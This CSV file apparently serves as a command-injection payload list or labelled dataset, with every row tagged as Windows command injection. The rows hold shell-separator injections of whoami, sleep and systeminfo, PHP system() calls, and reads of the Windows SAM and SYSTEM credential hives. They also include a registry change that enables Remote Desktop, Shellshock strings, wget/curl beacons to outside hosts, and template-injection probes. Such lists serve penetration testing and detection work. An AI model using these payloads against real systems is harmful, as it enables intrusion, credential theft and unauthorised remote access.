value,label,description
"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",Command Injection,Windows
"<?php system(""sleep 10"");?>",Command Injection,Windows
"<?php system(""sleep 5"");?>",Command Injection,Windows
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",Command Injection,Windows
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",Command Injection,Windows
:phpversion();,Command Injection,Windows
`ping 127.0.0.1`,Command Injection,Windows
& ping -i 30 127.0.0.1 &,Command Injection,Windows
& ping -n 30 127.0.0.1 &,Command Injection,Windows
;${@print(md5(RCEVulnerable))};,Command Injection,Windows
"${@print(""RCEVulnerable"")}",Command Injection,Windows
${@print(system($_SERVER['HTTP_USER_AGENT']))},Command Injection,Windows
pwd,Command Injection,Windows
| pwd,Command Injection,Windows
; pwd,Command Injection,Windows
& pwd,Command Injection,Windows
&& pwd,Command Injection,Windows
\r,Command Injection,Windows
"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",Command Injection,Windows
"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",Command Injection,Windows
"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",Command Injection,Windows
"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",Command Injection,Windows
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",Command Injection,Windows
\r\n,Command Injection,Windows
route,Command Injection,Windows
| sleep 1,Command Injection,Windows
; sleep 1,Command Injection,Windows
& sleep 1,Command Injection,Windows
&& sleep 1,Command Injection,Windows
sleep 1,Command Injection,Windows
|| sleep 10,Command Injection,Windows
| sleep 10,Command Injection,Windows
; sleep 10,Command Injection,Windows
{${sleep(10)}},Command Injection,Windows
& sleep 10 ,Command Injection,Windows
&& sleep 10,Command Injection,Windows
sleep 10,Command Injection,Windows
|| sleep 15,Command Injection,Windows
| sleep 15,Command Injection,Windows
; sleep 15,Command Injection,Windows
& sleep 15 ,Command Injection,Windows
&& sleep 15,Command Injection,Windows
 {${sleep(20)}},Command Injection,Windows
{${sleep(20)}},Command Injection,Windows
 {${sleep(3)}},Command Injection,Windows
{${sleep(3)}},Command Injection,Windows
| sleep 5,Command Injection,Windows
; sleep 5,Command Injection,Windows
& sleep 5,Command Injection,Windows
&& sleep 5,Command Injection,Windows
sleep 5,Command Injection,Windows
 {${sleep(hexdec(dechex(20)))}} ,Command Injection,Windows
{${sleep(hexdec(dechex(20)))}} ,Command Injection,Windows
sysinfo,Command Injection,Windows
| sysinfo,Command Injection,Windows
; sysinfo,Command Injection,Windows
& sysinfo,Command Injection,Windows
&& sysinfo,Command Injection,Windows
system('cat C:\boot.ini');,Command Injection,Windows
system('cat config.php');,Command Injection,Windows
|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,Command Injection,Windows
| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,Command Injection,Windows
; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,Command Injection,Windows
& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,Command Injection,Windows
&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,Command Injection,Windows
system('curl https://crowdshield.com/.testing/rce_vuln.txt'),Command Injection,Windows
system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),Command Injection,Windows
system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,Command Injection,Windows
system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),Command Injection,Windows
systeminfo,Command Injection,Windows
| systeminfo,Command Injection,Windows
; systeminfo,Command Injection,Windows
& systeminfo,Command Injection,Windows
&& systeminfo,Command Injection,Windows
system('ls'),Command Injection,Windows
system('pwd'),Command Injection,Windows
system('pwd');,Command Injection,Windows
|| system('sleep 5');,Command Injection,Windows
| system('sleep 5');,Command Injection,Windows
; system('sleep 5');,Command Injection,Windows
& system('sleep 5');,Command Injection,Windows
&& system('sleep 5');,Command Injection,Windows
system('sleep 5'),Command Injection,Windows
system('sleep 5');,Command Injection,Windows
system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),Command Injection,Windows
system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,Command Injection,Windows
system('whoami'),Command Injection,Windows
system('whoami');,Command Injection,Windows
test*; ls -lhtR /var/www/,Command Injection,Windows
"test* || perl -e 'print ""X""x16096'",Command Injection,Windows
"test* | perl -e 'print ""X""x16096'",Command Injection,Windows
"test* & perl -e 'print ""X""x16096'",Command Injection,Windows
"test* && perl -e 'print ""X""x16096'",Command Injection,Windows
"test*; perl -e 'print ""X""x16096'",Command Injection,Windows
$(`type C:\boot.ini`),Command Injection,Windows
&&type C:\\boot.ini,Command Injection,Windows
| type C:\Windows\repair\SAM,Command Injection,Windows
; type C:\Windows\repair\SAM,Command Injection,Windows
& type C:\Windows\repair\SAM,Command Injection,Windows
&& type C:\Windows\repair\SAM,Command Injection,Windows
type C:\Windows\repair\SAM,Command Injection,Windows
| type C:\Windows\repair\SYSTEM,Command Injection,Windows
; type C:\Windows\repair\SYSTEM,Command Injection,Windows
& type C:\Windows\repair\SYSTEM,Command Injection,Windows
&& type C:\Windows\repair\SYSTEM,Command Injection,Windows
type C:\Windows\repair\SYSTEM,Command Injection,Windows
| type C:\WINNT\repair\SAM,Command Injection,Windows
; type C:\WINNT\repair\SAM,Command Injection,Windows
& type C:\WINNT\repair\SAM,Command Injection,Windows
&& type C:\WINNT\repair\SAM,Command Injection,Windows
type C:\WINNT\repair\SAM,Command Injection,Windows
type C:\WINNT\repair\SYSTEM,Command Injection,Windows
| type %SYSTEMROOT%\repair\SAM,Command Injection,Windows
; type %SYSTEMROOT%\repair\SAM,Command Injection,Windows
& type %SYSTEMROOT%\repair\SAM,Command Injection,Windows
&& type %SYSTEMROOT%\repair\SAM,Command Injection,Windows
type %SYSTEMROOT%\repair\SAM,Command Injection,Windows
| type %SYSTEMROOT%\repair\SYSTEM,Command Injection,Windows
; type %SYSTEMROOT%\repair\SYSTEM,Command Injection,Windows
& type %SYSTEMROOT%\repair\SYSTEM,Command Injection,Windows
&& type %SYSTEMROOT%\repair\SYSTEM,Command Injection,Windows
type %SYSTEMROOT%\repair\SYSTEM,Command Injection,Windows
uname,Command Injection,Windows
;uname;,Command Injection,Windows
| uname -a,Command Injection,Windows
; uname -a,Command Injection,Windows
& uname -a,Command Injection,Windows
&& uname -a,Command Injection,Windows
uname -a,Command Injection,Windows
|/usr/bin/id,Command Injection,Windows
;|/usr/bin/id|,Command Injection,Windows
;/usr/bin/id|,Command Injection,Windows
$;/usr/bin/id,Command Injection,Windows
"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",Command Injection,Windows
() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,Command Injection,Windows
| wget http://crowdshield.com/.testing/rce.txt,Command Injection,Windows
& wget http://crowdshield.com/.testing/rce.txt,Command Injection,Windows
; wget https://crowdshield.com/.testing/rce_vuln.txt,Command Injection,Windows
$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),Command Injection,Windows
&& wget https://crowdshield.com/.testing/rce_vuln.txt,Command Injection,Windows
wget https://crowdshield.com/.testing/rce_vuln.txt,Command Injection,Windows
$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),Command Injection,Windows
which curl,Command Injection,Windows
which gcc,Command Injection,Windows
which nc,Command Injection,Windows
which netcat,Command Injection,Windows
which perl,Command Injection,Windows
which python,Command Injection,Windows
which wget,Command Injection,Windows
whoami,Command Injection,Windows
| whoami,Command Injection,Windows
; whoami,Command Injection,Windows
' whoami,Command Injection,Windows
' || whoami,Command Injection,Windows
' & whoami,Command Injection,Windows
' && whoami,Command Injection,Windows
'; whoami,Command Injection,Windows
""" whoami",Command Injection,Windows
""" || whoami",Command Injection,Windows
""" | whoami",Command Injection,Windows
""" & whoami",Command Injection,Windows
""" && whoami",Command Injection,Windows
"""; whoami",Command Injection,Windows
$(`whoami`),Command Injection,Windows
& whoami,Command Injection,Windows
&& whoami,Command Injection,Windows
"{{ get_user_file(""C:\boot.ini"") }}",Command Injection,Windows
"{{ get_user_file(""/etc/hosts"") }}",Command Injection,Windows
{{4+4}},Command Injection,Windows
{{4+8}},Command Injection,Windows
{{person.secret}},Command Injection,Windows
{{person.name}},Command Injection,Windows
{1} + {1},Command Injection,Windows
"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",Command Injection,Windows
{{[] .__ Class __.__ base __.__ subclasses __ ()}},Command Injection,Windows
